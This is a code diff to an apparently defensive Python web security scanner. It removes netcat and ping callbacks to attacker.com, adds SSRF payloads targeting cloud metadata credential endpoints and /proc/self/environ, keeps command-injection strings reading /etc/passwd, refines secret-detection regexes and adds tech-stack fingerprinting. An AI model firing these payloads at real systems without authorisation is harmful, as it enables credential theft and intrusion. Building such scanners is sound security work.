@@ -53,17 +53,37 @@ class SecurityScanner:
             "| cat /etc/passwd",
             "`whoami`",
             "$(id)",
-            "; ping -c 1 attacker.com",
-            "| nc attacker.com 4444",
+            # Note: network callback payloads (ping, nc) require a controlled
+            # listener and must be configured by the operator, not hardcoded
         ]
         
         self.ssrf_payloads = [
-            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
-            "http://localhost:22",
-            "http://127.0.0.1:3306",  # MySQL
-            "http://127.0.0.1:5432",  # PostgreSQL
-            "http://127.0.0.1:6379",  # Redis
+            "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+            "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
             "file:///etc/passwd",
+            "file:///proc/self/environ",
+            # Note: localhost/127.0.0.1 probes intentionally excluded to avoid
+            # accidentally hitting the operator's own services
+        ]
+
+        self.ssrf_indicators = [
+            r'url=',
+            r'redirect=',
+            r'next=',
+            r'target=',
+            r'dest=',
+            r'destination=',
+            r'redir=',
+            r'return=',
+            r'return_url=',
+            r'callback=',
+            r'path=',
+            r'data=',
+            r'fetch=',
+            r'img=',
+            r'src=',
         ]
     
     def scan(self, url: str, headers: Dict[str, str], body: str, forms: List[Dict]) -> List[Dict[str, Any]]:
@@ -90,7 +110,11 @@ class SecurityScanner:
         # Check for exposed sensitive files
         sensitive_findings = self._check_sensitive_exposure(body)
         findings.extend(sensitive_findings)
-        
+
+        # Check for SSRF-prone URL parameters
+        ssrf_findings = self._check_ssrf_params(url)
+        findings.extend(ssrf_findings)
+
         self.findings.extend(findings)
         return findings
     
@@ -253,13 +277,16 @@ class SecurityScanner:
         findings = []
         
         patterns = {
-            "API Key": r'[a-zA-Z0-9_-]{32,}',
+            # Specific patterns first — avoid the 32+ char catch-all which matches everything
             "AWS Key": r'AKIA[0-9A-Z]{16}',
+            "AWS Secret": r'(?i)aws[_\-\s]?secret[_\-\s]?(?:access[_\-\s]?)?key["\']?\s*[:=]\s*["\'][A-Za-z0-9/+=]{40}["\']',
+            "GitHub Token": r'gh[pousr]_[A-Za-z0-9]{36}',
+            "Stripe Key": r'sk_(?:live|test)_[A-Za-z0-9]{24,}',
+            "Slack Token": r'xox[baprs]-[A-Za-z0-9-]{10,}',
+            "Google API Key": r'AIza[0-9A-Za-z\-_]{35}',
             "Private Key": r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
-            "Password": r'password["\']?\s*[:=]\s*["\'][^"\']+["\']',
-            "Secret": r'secret["\']?\s*[:=]\s*["\'][^"\']+["\']',
-            "Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
-            "IP Address": r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
+            "Password in Code": r'(?i)password["\']?\s*[:=]\s*["\'][^"\'\s]{6,}["\']',
+            "Secret in Code": r'(?i)(?:secret|api_key|apikey)["\']?\s*[:=]\s*["\'][^"\'\s]{8,}["\']',
         }
         
         for name, pattern in patterns.items():
@@ -276,14 +303,131 @@ class SecurityScanner:
         
         return findings
     
+    def _check_ssrf_params(self, url: str) -> List[Dict[str, Any]]:
+        """Detect URL parameters that could be SSRF vectors."""
+        from urllib.parse import parse_qs, urlparse
+        findings = []
+        parsed = urlparse(url)
+        if not parsed.query:
+            return findings
+        params = parse_qs(parsed.query)
+        for param in params:
+            for indicator in self.ssrf_indicators:
+                pattern = indicator.rstrip('=') + '='
+                if param.lower() == indicator.rstrip('='):
+                    findings.append({
+                        "type": "Potential SSRF Vector",
+                        "severity": "Medium",
+                        "parameter": param,
+                        "url": url,
+                        "evidence": f"Parameter '{param}' may accept URLs — test for SSRF",
+                        "remediation": "Validate and allowlist URL destinations server-side",
+                    })
+                    break
+        return findings
+
+    def fingerprint_tech(self, url: str, headers: Dict[str, str], body: str) -> Dict[str, List[str]]:
+        """Detect technology stack from headers and HTML."""
+        tech: Dict[str, List[str]] = {
+            "CMS": [],
+            "Framework": [],
+            "Server": [],
+            "CDN / Proxy": [],
+            "Analytics": [],
+            "JavaScript": [],
+            "Security": [],
+            "Language": [],
+        }
+
+        h = {k.lower(): v for k, v in headers.items()}
+
+        # Server header
+        if 'server' in h:
+            tech["Server"].append(h['server'])
+
+        # X-Powered-By
+        if 'x-powered-by' in h:
+            tech["Language"].append(h['x-powered-by'])
+
+        # CDN / Proxy detection
+        cdn_headers = {
+            'cf-ray': 'Cloudflare',
+            'x-cache': 'Cache layer',
+            'x-amz-cf-id': 'AWS CloudFront',
+            'x-fastly-request-id': 'Fastly',
+            'x-varnish': 'Varnish',
+            'via': None,
+        }
+        for hdr, label in cdn_headers.items():
+            if hdr in h:
+                tech["CDN / Proxy"].append(label or h[hdr])
+
+        # WAF detection
+        if 'x-sucuri-id' in h:
+            tech["Security"].append("Sucuri WAF")
+        if h.get('server', '').lower().startswith('awselb'):
+            tech["CDN / Proxy"].append("AWS ELB")
+
+        # Body-based detection
+        body_lower = body.lower()
+
+        cms_patterns = {
+            "WordPress": ['/wp-content/', '/wp-includes/', 'wp-json'],
+            "Drupal": ['drupal.org', 'drupal.js', '/sites/default/'],
+            "Joomla": ['/media/jui/', 'joomla!'],
+            "Ghost": ['ghost.org/changelog', 'ghost/api'],
+            "Shopify": ['cdn.shopify.com', 'shopifycdn.com'],
+            "Squarespace": ['squarespace.com', 'static.squarespace'],
+            "Wix": ['static.wixstatic.com', 'wix.com/'],
+            "Webflow": ['webflow.com', 'uploads-ssl.webflow'],
+        }
+        for cms, patterns in cms_patterns.items():
+            if any(p in body_lower for p in patterns):
+                tech["CMS"].append(cms)
+
+        framework_patterns = {
+            "React": ['react.development.js', 'react.production.js', '__reactFiber', 'data-reactroot'],
+            "Vue.js": ['vue.runtime', '__vue__', 'data-v-'],
+            "Angular": ['angular.min.js', 'ng-version=', 'data-ng-'],
+            "Next.js": ['_next/static', '__NEXT_DATA__'],
+            "Nuxt.js": ['_nuxt/', '__nuxt'],
+            "Django": ['csrfmiddlewaretoken', 'django'],
+            "Laravel": ['laravel_session', 'laravel', 'x-csrf-token'],
+            "Ruby on Rails": ['rails.js', 'authenticity_token'],
+            "Express.js": ['x-powered-by: express'],
+            "Flask": ['werkzeug', 'flask'],
+        }
+        for fw, patterns in framework_patterns.items():
+            if any(p.lower() in body_lower or p.lower() in str(headers).lower() for p in patterns):
+                tech["Framework"].append(fw)
+
+        js_patterns = {
+            "jQuery": ['jquery.min.js', 'jquery-'],
+            "Bootstrap": ['bootstrap.min.js', 'bootstrap.min.css'],
+            "Tailwind CSS": ['tailwindcss', 'cdn.tailwindcss'],
+            "Google Analytics": ['google-analytics.com', 'gtag(', 'UA-'],
+            "Google Tag Manager": ['googletagmanager.com', 'GTM-'],
+            "Hotjar": ['hotjar.com', 'hj('],
+            "Intercom": ['intercom.io', 'intercomSettings'],
+            "Stripe": ['js.stripe.com'],
+            "Sentry": ['sentry.io', 'Sentry.init'],
+        }
+        for lib, patterns in js_patterns.items():
+            if any(p.lower() in body_lower for p in patterns):
+                cat = "Analytics" if lib in ("Google Analytics", "Google Tag Manager", "Hotjar") else "JavaScript"
+                tech[cat].append(lib)
+
+        # Deduplicate
+        return {k: list(set(v)) for k, v in tech.items()}
+
     def generate_report(self) -> Dict[str, Any]:
         """Generate security scan report."""
         severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
-        
+
         for finding in self.findings:
             sev = finding.get("severity", "Info")
             severity_counts[sev] = severity_counts.get(sev, 0) + 1
-        
+
         return {
             "total_findings": len(self.findings),
             "severity_breakdown": severity_counts,
